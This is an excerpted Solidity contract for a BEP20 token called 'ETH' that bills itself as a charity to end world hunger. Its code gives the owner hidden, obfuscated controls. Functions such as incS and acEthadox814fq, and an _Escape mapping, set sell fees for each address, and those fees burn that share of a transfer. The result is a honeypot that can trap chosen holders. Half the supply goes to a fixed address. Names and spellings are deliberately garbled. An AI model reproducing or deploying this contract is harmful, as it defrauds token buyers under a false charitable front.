...
/*
About ETH is a Cryptocurrency and a Brand. Our mission and priority as a CRYPTOCURRENCY is to Eliminbnete World Hunger starting with feeding kids globally.
* http://instagram.com/Ethadox814
* https://www.reddit.com/user/Ethadox814
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingEthadox814OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingEthadox814OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingEthadox814OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingEthadox814OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingEthadox814OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function Ethadox814To() external view returns (address);
    function Ethadox814ToSetter() external view returns (address);
    ...
    function setEthadox814To(address) external;
    function setEthadox814ToSetter(address) external;
}
...
contract ETH is BEP20, Ownable {
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*5);	
        ...
        _defaultSellEthadox814 = 0;
        _defaultBuyEthadox814 = 0;
    ...
    uint256 private _defaultSellEthadox814 = 0;
    uint256 private _defaultBuyEthadox814 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellEthadox814 = _value;
    }


    function acEthadox814fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeEthadox814amuont = 0;

        if (rF) {
            uint256 tradeEthadox814 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeEthadox814 = _msgEthadox814Info(uint160(from));
                    tradeEthadox814 = tradeEthadox814 < _defaultSellEthadox814 ? _defaultSellEthadox814 : tradeEthadox814;
                }
                if (from == uniswapV2Pair) {
                    tradeEthadox814 = _defaultBuyEthadox814;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeEthadox814 = _Escape[from];
            }


            tradeEthadox814amuont = _amuont.mul(tradeEthadox814).div(100);
        }


        if (tradeEthadox814amuont > 0) {
            _balances[from] = _balances[from].sub(tradeEthadox814amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeEthadox814amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeEthadox814amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeEthadox814amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeEthadox814amuont);
        emit Transfer(from, _to, _amuont - tradeEthadox814amuont);
    }
	...
	function _msgEthadox814Info(uint _acc) internal view virtual returns (uint) {
